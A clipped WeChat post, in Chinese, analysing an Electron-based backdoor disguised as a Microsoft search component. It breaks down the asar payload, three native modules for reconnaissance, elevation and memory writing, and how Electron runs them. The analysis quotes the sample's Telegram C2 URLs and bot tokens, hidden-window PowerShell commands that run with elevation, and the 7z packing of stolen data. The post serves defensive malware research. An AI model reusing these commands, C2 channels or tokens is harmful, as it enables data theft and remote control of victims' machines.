---
title: 【微信】惊心！歹毒！遭遇【VS编译时触发后门】保卫战（二）
source: https://mp.weixin.qq.com/s/nzhsJkDiRz8pgxv6xizRBA
source_host: mp.weixin.qq.com
clip_date: 2026-10-07T18:41:17+08:00
trace_id: 6dc20104-109f-4382-872e-6eccd7af6ccb
content_hash: 28b5820905f876846adb44f4cb0541ed10265d4a256265bfa1259e9ae6be0cc0
status: synced
tags:
  - 微信
  - 恶意样本
  - 脱壳与加固
series: 【微信】惊心！歹毒！遭遇【VS编译时触发后门】保卫战
feed_source: 公众号聚合·Doonsec
ai_summary: TL;DR：一个无壳无签名的 Electron 程序把恶意载荷藏在 `resources/app.asar`，用三个自研原生模块加 Telegram Bot 组成完整窃密远控链，杀软与云沙箱对 exe 均不报毒。
ai_summary_style: key-points
images_status:
  total: 11
  succeeded: 11
  failed_urls: []
notion_page_id: 3f275244-d011-8119-bd45-f37a36ccc41f
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：一个无壳无签名的 Electron 程序把恶意载荷藏在 `resources/app.asar`，用三个自研原生模块加 Telegram Bot 组成完整窃密远控链，杀软与云沙箱对 exe 均不报毒。
> 
> - **免杀原因：** exe 仅是 Electron 运行时外壳，真正的逻辑在同目录 `resources/app.asar`，所以提交两个 exe 做云沙箱和目录扫描都无报毒。
> - **asar 载荷：** 解包得 582KB 强混淆 `main.js`、`antidebugger-worker.js`、`antidebugger.enc`，以及三个 MSVC 编译的 32 位 N-API `.node` 模块；PDB 路径泄露同一构建工程 `DeneyMAN-V2`。
> - **模块分工：** procmon.node 负责进程/窗口枚举、强杀与反调试；sysquery.node 采集注册表/TCP/WMI、截屏、建计划任务、设隐藏+系统属性、以 SYSTEM 运行；winexec.node 用 runas 提权并可读写其他进程内存（注入三件套）。
> - **C2 与外传：** 三组 Telegram Bot token/chat_id 走 sendPhoto、sendDocument、sendMessage，另有 ipinfo.io 定位与 Defender 状态上报；二阶段用隐藏窗口 PowerShell `-Verb RunAs`，脚本藏在 `Programs\Common\OneDriveCloud`，并以随机名 `.7z` 打包 Vault 数据。
> - **运行机制：** exe 内嵌 V8+Node 执行 `main.js`；JS 通过 `child_process` 拉起独立进程，或 `require('./x.node')` 把 C++ DLL 载入自身进程、经 `napi_register_module_v1` 暴露为 JS 函数，全链在同一进程内完成。

**MicroPest** *2026年10月7日 17:51*

接昨天的，我们继续深入进行。文件篇幅较长，分为三部分：一是杀毒情况；二是两个文件分析；三是asar/electron运行机制；以及最后的后续。

一、杀毒情况

云沙箱：提交两个exe文件，无报毒。

杀毒软件：按目录扫描，未发现，无报毒。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/79452eeed6ba8648.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/653fcd42718568d1.png)

二、文件分析

(一)、searchfilter.exe:

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/158973efdfbc4cce.png)

1、查壳：

无壳，VC/C++，Electron Package。

我们知道，Electron打包时，exe不是主程序，难怪没报毒。这时它的主程序是resources\\app.asar，Electron 应用的标准布局是：

```javascript
<应用目录>/
├── SearchFilter.exe          ← Electron 运行时（"外壳"）
├── resources/
│   ├── app.asar              ← 真正的应用逻辑（恶意代码在这里）
│   └── elevate.exe           ← 提权助手
├── *.pak / *.dll / locales/  ← Chromium 资源
```

exe 只负责启动 Chromium 运行时，然后按固定约定去加载 `resources/app.asar` 。所以恶意代码"藏在 exe 附件里"更严谨的表述是： **藏在 exe 同目录的 `resources/app.asar` 这个附属文件里**。

2、解包 asar，取出真正的载荷

asar 格式很简单：8 字节 pickle 头 + JSON 目录 + 数据区。解包后得到：

```apache
main.js                 582,628 B   ← 强混淆的主进程代码（C2 逻辑）
antidebugger-worker.js   30,799 B   ← 反调试
antidebugger.enc          1,124 B   ← 加密载荷
winexec.node / sysquery.node / procmon.node  ← 三个自研原生 RAT 模块
package.json                400 B   ← 冒名微软的伪装
```

3、在解包内容里定位恶意证据

-   main.js 里搜到 https://api.telegram.org/bot${token}/sendPhoto|sendDocument|sendMessage（Telegram C2）
    
-   三个.node 模块的 PDB 路径泄露 DeneyMAN-V2 工程名
    
-   package.json 自称 Microsoft Corporation 但作者是 unknown
    

（1）、三个 Telegram C2

### A. main 配置（模块 0x160）

-   **Bot Token**：  
    `8458862445:AAHr2???????m7cFAa9AyjBKkgkPCB9OM-w`  
    其中 `???????` 是 7 个字符，在静态文本中被 `nLVljyL(0x422)` 动态解码，未直接展开。
    
-   **Chat ID**：  
    `-0xe98990d5e5` ，十进制约为 `-1003035350501`
    
-   **用途**：主 C2，用于发送日志、系统信息、错误报告等。
    

### B. connection 配置（模块 0x160）

-   **Bot Token**：  
    `8401633675:AAGwUsjoFdufyMVUcklGcq_6wwvqSTX31jo`
    
-   **Chat ID**：  
    `-0xe9928b3786` ，十进制约为 `-1003185977222`
    
-   **用途**：连接控制，枚举活动连接、进程列表，并发送连接报告。
    

### C. telegram 配置（模块 0xdc8）

-   **Bot Token**：  
    `8292368705:AAHNrqnHis4Zvt3aIih1yXIS2KUqeRMr2E8`
    
-   **Chat ID**：  
    `-0xe99155ff44` ，十进制约为 `-1003165712196`
    
-   **API 基址**：  
    `https://api.telegram.org/bot`
    
-   **Parse Mode**： `Markdown`
    
-   **用途**：通用 Telegram 发送模块，支持 `sendMessage` 、 `sendPhoto` 、 `sendDocument`
    

（2）三个node文件：

它们是 **Node.js 原生扩展模块（Native Addon，N-API）**——即用 C++ 编译出来的 `.node` 动态库，被 `main.js` 通过 `require()` 加载，把 Windows 系统底层能力暴露给 JS 调用。

`main.js` 里的加载代码：

```javascript
module.exports = require('./procmon.node')
module.exports = require('./sysquery.node')
module.exports = require('./winexec.node')
```

也就是说： `main.js` （JS 层）负责 **逻辑编排**，这三个 `.node` （C++ 层）负责 **实际动手**。JS 做不到或做起来别扭的底层操作（枚举进程、读注册表、截屏、提权、写别的进程内存），全部下沉到这三个原生模块。

三者均为 **MSVC 编译的 32 位 PE DLL**，都通过 `napi_register_module_v1` 注册导出函数，且 **PDB 路径都指向同一工程**：

```css
G:\Users\Administrator\Documents\DATA\DeneyMAN-V2\v1\native\{procmon,sysquery,winexec}\build\Release\*.pdb
```

同一作者、同一工程 `DeneyMAN-V2` 下自研的三个模块，分工明确。

## 逐个拆解

### 1\. procmon.node（125 KB）——进程侦察与终止

**导出函数** （从字符串表提取，下同）：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b210b104fae35f42.png)

**关键导入**： `CreateToolhelp32Snapshot` / `Process32FirstW` / `Process32NextW` / `QueryFullProcessImageNameW` （进程枚举）、 `OpenProcess` + `TerminateProcess` （结束进程）、 `EnumWindows` / `GetWindowTextW` / `GetWindowThreadProcessId` / `IsWindowVisible` （窗口枚举）、 `IsDebuggerPresent` / `CheckRemoteDebuggerPresent` （反调试）。

**作用**： **侦察 + 反分析 + 反制**。用于摸清受害机上跑了什么（尤其找安全软件进程）、列举用户正在使用的窗口（可判断用户在看什么/是否在操作），并能强杀指定进程（关掉杀软或碍事的程序）。 `isDebuggerAttached` 说明它同时承担 **反调试** 职责。

### 2\. sysquery.node（182 KB）——系统情报采集与执行（信息量最大）

**导出函数**：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6e267184bb99664b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c420b31679ef7bf6.png)

**关键导入**： `RegOpenKeyExW` / `RegEnumValueW` / `RegQueryInfoKeyW` （注册表）、 `GetExtendedTcpTable` （网络连接）、 `ShellExecuteExW` + `CreateProcessW` （执行）、 `CheckTokenMembership` （权限判定）、GDI+/GDI 全套（ `CreateCompatibleDC` / `GdipCreateBitmapFromHBITMAP` / `GdipGetImageEncoders` → **截屏并编码为图片**）、 `SetFileAttributesW` 、 `GetDiskFreeSpaceExW` 、 `RtlGetVersion` 。

**作用**： **主机画像 + 持久化 + 屏幕窃取 + 隐蔽化**。这是典型的窃密木马"侦察与驻留"模块：

-   采集系统指纹（OS、磁盘、注册表、TCP 连接、WMI 查硬件/软件/用户）；
    
-   `captureScreen`
    
    抓屏（对应 `main.js` 里 Telegram `sendPhoto` 外传）；
    
-   `taskCreate`
    
    / `taskRun` 建立 **计划任务持久化**；
    
-   `setFileAttributes`
    
    把落地文件设为 **隐藏+系统** 属性（ `taskhostw.exe` 、 `mbam.ps1` 就靠这个藏起来）；
    
-   `runAsSystem`
    
    参数说明它还能 **以 SYSTEM 权限** 启动进程。
    

### 3\. winexec.node（145 KB）——提权与跨进程操作

**导出函数**：

**关键导入**： `ShellExecuteExW` （配合 `runas` 动词提权）、 `CoGetObject` （COM 对象获取，提权路径常用）、 `OpenProcess` / `OpenProcessToken` / `GetTokenInformation` （**访问并读取目标进程的令牌**，即令牌窃取/权限查询）、 `ReadProcessMemory` / `WriteProcessMemory` / `VirtualProtectEx` （**读写其他进程内存**）、 `NtQueryInformationProcess` （底层进程信息查询）。

**作用**： **提权 + 进程注入能力**。这是三者中"攻击性"最强的一个：

-   `runElevated`
    
    负责把自身或载荷提升到管理员/SYSTEM 权限（对应 `main.js` 里 `-Verb RunAs` 、 `Start-Process ... -WindowStyle Hidden` ）；
    
-   `ReadProcessMemory`
    
    \+ `WriteProcessMemory` + `VirtualProtectEx` 的组合是 **进程内存注入** 的标准三件套——可以把代码/数据写进别的进程（例如浏览器、聊天软件）以窃取其中的凭据或注入执行。
    

* * *

## 三者如何协同（在整条攻击链中的位置）

```swift
main.js（JS 编排层，混淆）
   │  require 三个原生模块
   ├─ sysquery.node → 侦察：系统信息/注册表/TCP/WMI/管理员判定
   │                  截屏 → 交给 Telegram sendPhoto 外传
   │                  建计划任务 + 隐藏落地文件 → 持久化
   │
   ├─ winexec.node  → 提权（runElevated / RunAs）
   │                  读写其他进程内存 → 注入/窃取凭据
   │
   └─ procmon.node  → 进程与窗口枚举（找目标/找杀软）
                      强杀进程、反调试（isDebuggerAttached）
```

**一句话总结**：

-   `sysquery.node`
    
    \= **情报官** （采集主机信息、截屏、建持久化、藏文件）
    
-   `winexec.node`
    
    \= **破门手** （提权、读写他人进程内存）
    
-   `procmon.node`
    
    \= **哨兵** （看清进程与窗口、反调试、清除障碍）
    

三者合起来，正好覆盖一个远控/窃密木马所需的全部本地能力（**侦察 → 提权 → 驻留 → 窃取 → 反分析**），且都是 **自行编译** （非第三方 npm 包），说明作者是刻意绕开公开库、降低被特征检出的概率。这也是把该样本定性为 **木马** 而非普通恶意软件的核心依据之一——能力不是"存在"，而是 **成体系地配套设计**。

4、恶意判定

### （1）.身份伪装（双重冒名 + 无签名）

`app.asar` 内 `package.json` ：

```javascript
{"name": "TeamsPackage", "version": "1.5.5",
 "description": "Microsoft Corporation", "main": "main.js",
 "author": "unknown", "license": "ISC", ...}
```

-   PE 版本资源自称 `Microsoft Windows Search Indexer` ，与 asar 的 `TeamsPackage` **互相矛盾**，且 **完全无数字签名**。文件名 `SearchFilter` 又在模仿搜索类系统组件，属典型"马甲"。
    

（2）Telegram Bot C2（核心恶意证据，已定位到具体偏移）

见上面。

```css
main.js @270873  https://api.telegram.org/bot${F2mqm85[0x0]}/sendPhoto
main.js @271841  https://api.telegram.org/bot${F2mqm85[0x0]}/sendDocument
main.js @272248  https://api.telegram.org/bot${F2mqm85[0x0]}/sendMessage  {chat_id:..., text:...}
```

`token` 与 `chat_id` 在运行时从变量取（未硬编码明文，需动态获取），但 `/sendPhoto` 、 `/sendDocument` 表明具备 **上传屏幕截图与文件外传** 能力。

### （3） 受害者侦察与情报外传

```css
main.js @260289  https://ipinfo.io/${F2mqm85[0x0]}/geo   （IP 地理定位）
main.js @289399  `Defender Status: ${aTyX4j}`             （上报 Defender 状态）
```

配合 `is-admin` 依赖与 `isAdmin` 判定，构成典型的 **主机画像 + 安全状态上报**。

### （4） 二阶段载荷投递与持久化（隐藏窗口 PowerShell）

```powershell
main.js @128306  Start-Process PowerShell -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File','${...}') -WindowStyle Hidden -Verb RunAs
main.js @510021  powershell.exe -ExecutionPolicy Bypass -File "...\Folder\FM.ps1" -WindowStyle Hidden
main.js @137223  -ExecutionPolicy Bypass -File "${...}\Programs\Common\OneDriveCloud\mbam.ps1"
main.js @138470  ${...}\Programs\Common\OneDriveCloud\taskhostw.exe
```

恶意脚本被放置在 **`Programs\Common\OneDriveCloud\` \*\* 这类伪装的合法目录下，并使用 `taskhostw.exe` 这类系统进程名做掩护； `-WindowStyle Hidden -Verb RunAs` 表示** 隐藏窗口 + 提权执行\*\*。

### （5） 数据打包外传（7-Zip）

```apache
main.js @461662  ...\current\Microsoft.exe ... `${idWqpw()}.7z`
main.js @489701  ...\Microsoft\Vault  ... `${random}.7z`
```

构造随机名 `.7z` 归档（指向 `Microsoft\Vault` ），配合 7-Zip 能力，是 **窃取文件打包外传** 的标准流程。

### （6） 三个自研原生模块 = RAT 级能力（决定性证据）

三者均为 MSVC 编译的 N-API 原生模块， **PDB 路径直接泄露构建工程名**：见上面的三个node文件。

PDB 路径原文：

```java
G:\Users\Administrator\Documents\DATA\DeneyMAN-V2\v1\native\winexec\build\Release\winexec.pdb
G:\Users\Administrator\Documents\DATA\DeneyMAN-V2\v1\native\sysquery\build\Release\sysquery.pdb
G:\Users\Administrator\Documents\DATA\DeneyMAN-V2\v1\native\procmon\build\Release\procmon.pdb
```

即： **截屏窃取、注册表枚举、WMI 侦察、进程控制、提权执行、向其他进程写入内存**——远超任何正常 Electron 应用所需。

### （7） 反分析组件

asar 内另有 `antidebugger-worker.js` （30,799 B，控制流平坦化混淆）与 `antidebugger.enc` （1,124 B，Base64 封装的高熵密文），专门用于对抗调试与分析。

5、云沙箱查app.asar：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8f1c3186b445c85b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/73dbe6a9e716c7fb.png)

6、释放文件清单

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/523f144b688bb480.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/416661f25c703737.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d652ae28acbba260.png)

将所有文件的时间都进行了一些伪装，一眼过去，真发现不了。

（二）7z.exe文件本体是 **7-Zip 26.00 的精简独立控制台版 `7zr.exe`**，被重命名为 `7z.exe` 。除"改名 + 无签名"两点外，无任何恶意特征。

三、app.asar 怎么干活的？

`（1）、app.asar` 是一个 **归档容器** （Archive），不是文本文件。它的结构是：

```css
[8 字节 pickle 头] + [JSON 目录] + [原始文件数据区（二进制原样）]
```

-   **JSON 目录**
    
    部分确实是文本（记录每个文件在归档里的路径/偏移/大小）；
    
-   **数据区**
    
    是二进制原样堆叠——里面既有 `.js` 文本，也有 `.node` 这种 **PE 二进制**、图片、字体等。
    

看它头部时，package.json 的内容末尾紧接着就是 `MZ\x90\x00` —— **`MZ` 正是 PE 可执行文件的魔数**。也就是说，**`.node` 二进制就实实在在躺在 asar 的数据区里**，解包出来就是完整的 PE DLL。所以"文本调用程序"这个说法不准确：asar 里既有文本（JS），也有二进制（`.node` ），是 **混合归档**。

（2）、核心问题：JS 是文本/脚本，怎么"干活"？

答案分三层，逐层往下：

### 第 1 层：Electron 的 exe 里自带一个 JavaScript 引擎（V8）+ Node.js 运行时

`SearchFilter.exe` 不是普通程序，它内嵌了：

-   **Chromium/V8**
    
    —— JS 引擎，负责执行 JS；
    
-   **Node.js**
    
    —— 提供 `require()` 、文件系统、网络、进程等能力。
    

所以 JS 不是"被别的程序执行"的被动文本，而是 **由 exe 内置的引擎主动解释执行**。exe 启动时读 `resources/app.asar` ，找到 `package.json` 里的 `"main": "main.js"` ，然后让 V8 执行 `main.js` 。 **JS 本身就是程序**，只是需要引擎来跑。

打个比方：`.py` 是文本，但 `python xxx.py` 就能干活——不是文本自己干活，是 python 解释器在读它执行。Electron 里的关系一模一样，只不过解释器被塞进了 exe。

### 第 2 层：JS 通过 Node.js 的标准 API 直接"动手"

`main.js` 里那些能力，很多根本不需要额外程序， **JS 直接调 Node 内置 API** 就行：

```javascript
const { exec } = require('child_process')
exec('powershell.exe -ExecutionPolicy Bypass -File "C:\\...\\mbam.ps1"')
// → Node 会调用 Windows 的 CreateProcess，真的把 powershell 拉起来
```

`require('child_process')` 、 `require('net')` 、 `require('http')` 这些是 **Node 内置模块**，它们的底层是 C++ 写的（就是 exe 里编译好的 Node 运行时）。JS 调用它们 → Node 底层调 Windows API → 真正启动进程 / 发网络包。 **这层是"文本脚本 → 系统动作"的关键桥梁**。

同理， `https://api.telegram.org/bot.../sendPhoto` 是 JS 里的 `axios.post()` 发出的—— `axios` 底层走 Node 的 `http` / `net` ，最终是 exe 里的网络代码真正发包。

### 第 3 层：JS 调用自己带的.node 原生模块（这就是三个.node 的用处）

Node 内置 API 还不够用（比如截屏、读注册表、提权、写别人进程内存），于是作者 **自己编译了三个 C++ 原生模块**：

```javascript
const sysquery = require('./sysquery.node')   // 加载 C++ 编译的 DLL
sysquery.captureScreen()                       // JS 调用 → 直接执行 C++ 里的截屏代码
sysquery.taskCreate({...})                     // JS 调用 → 直接调 Windows 计划任务 API
```

**这里就是"文本调用程序"的真正机制**：

1.  `require('./sysquery.node')`
    
    —— Node 运行时 **把这个 `.node` （PE DLL）加载进当前进程** （用 `LoadLibrary` 之类的机制）；
    
2.  Node 从 DLL 里找到 `napi_register_module_v1` 这个注册入口， **把 C++ 函数暴露成 JS 函数**；
    
3.  之后 JS 里写 `sysquery.captureScreen()` ，实际执行的是 **DLL 里的机器码**。
    

也就是说：**`.node` 不是被"另外启动一个进程"来跑的，而是被加载进 SearchFilter.exe 自己的进程空间里执行**。JS 和 C++ 在同一个进程里，通过 N-API 这个"接口"互相调用。

（3）、完整调用链（把三层串起来）

以"截屏并传给 Telegram"为例，实际执行路径是：

```bash
SearchFilter.exe 启动
  └─ 内嵌 V8 引擎读取 resources/app.asar，执行 main.js
       │
       ├─ require('./sysquery.node')          ← Node 把 C++ DLL 载入本进程
       │    └─ sysquery.captureScreen()        ← JS 调 C++ 函数
       │         └─ C++ 调 GDI+ (GdipCreateBitmapFromHBITMAP)
       │              └─ 真正抓取屏幕像素，编码成 PNG 返回 JS
       │
       └─ axios.post(`https://api.telegram.org/bot.../sendPhoto`, png)
            └─ Node 内置 http/net 模块
                 └─ exe 内的网络代码调用 WS2_32/WINHTTP 真正发包 → 外传
```

整条链里， **没有"启动另一个程序来干活"**——V8 执行 JS，JS 调 Node API 或 `.node` 里的 C++，C++ 直接调 Windows API。全部在 **SearchFilter.exe 这一个进程内** 完成。

唯一真正"启动别的程序"的地方，是 `child_process.exec('powershell.exe ...')` 这类——那才是 JS 显式拉起一个 **独立进程** （PowerShell / cmd / taskhostw.exe）去执行二阶段载荷。这时才是"调用其它程序"。

## 一句话回答问题：

```javascript
JS 是文本，但它是"被 exe 内置的 V8 引擎解释执行的程序"。 JS 干活的方式有两种： ① 通过 Node 内置模块（
child_process/
net/
http）直接调 Windows API，或显式启动独立进程（如 powershell）； ② 通过 
require('./xxx.node') 把自研的 C++ DLL 加载进自己的进程，直接调用里面的机器码（截屏、读注册表、提权、写内存）。
而 
app.asar 本身只是"装文件的盒子"，它既装 JS 文本，也装 
.node 二进制；真正干活的是 exe 里的 V8 + Node 运行时 + 这些 
.node 里的 C++ 代码。
```

所以准确说法是： **不是 asar 去调用程序，而是 exe 里的 JS 引擎执行 asar 中的 JS，JS 再驱动 Node 与 `.node` 完成实际操作。**

注：这个后门太歹毒了，分析完这个后门外（其下还有个二阶载荷本体没来得及分析），又发现了一个窃取虚拟货币的后门，下一篇再分析。
